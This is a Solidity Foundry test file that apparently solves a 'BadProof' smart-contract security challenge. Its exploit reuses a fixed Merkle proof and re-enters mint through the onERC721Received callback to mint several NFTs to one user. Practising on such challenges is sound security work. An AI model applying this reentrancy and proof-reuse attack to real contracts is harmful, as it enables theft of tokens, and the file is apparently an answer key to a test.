// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {Test, console2} from "forge-std/Test.sol";
import {BadProofBaseTest} from "./BadProofBase.t.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";

interface IBadProof {
    function mint(address addr, bytes32[] memory proof) external;
    function genNode(address addr, uint256 tokenId) external returns (bytes32);
}

contract BadProofTest is BadProofBaseTest, IERC721Receiver  {
    bytes32 private constant PROOF0 = 0xc471bda26e2e9f486b58f8f86bf6b700bb9d0db6dafabec4ee3f352a216fc396;
    bytes32 private constant PROOF1 = 0x2357f919416fa706364ed9497630e70c41e2e43d16665f71375e9fef824c381c;
    bytes32 private constant PROOF2 = 0x7410dc0396cf7f6d7d7be35e28840e3af1ec80b7bf609b2b650a8d3534ddaa12;
    uint256 private constant MAX_TOKENS = 8;

    function testExploit() external validation {
        bytes32[] memory proofPath = new bytes32[](3);
        proofPath[0] = PROOF0;
        proofPath[1] = PROOF1;
        proofPath[2] = PROOF2;
        
        token.mint(user7, proofPath);
    }

    function onERC721Received(
        address operator,
        address from,
        uint256 tokenId,
        bytes calldata data
    ) external override returns (bytes4) {
        if(tokenId < MAX_TOKENS) {
            bytes32[] memory proofPath = new bytes32[](3);
            proofPath[0] = PROOF0;
            proofPath[1] = PROOF1;
            proofPath[2] = PROOF2;
            
            token.mint(user7, proofPath);
        }
        
        return this.onERC721Received.selector;
    }
}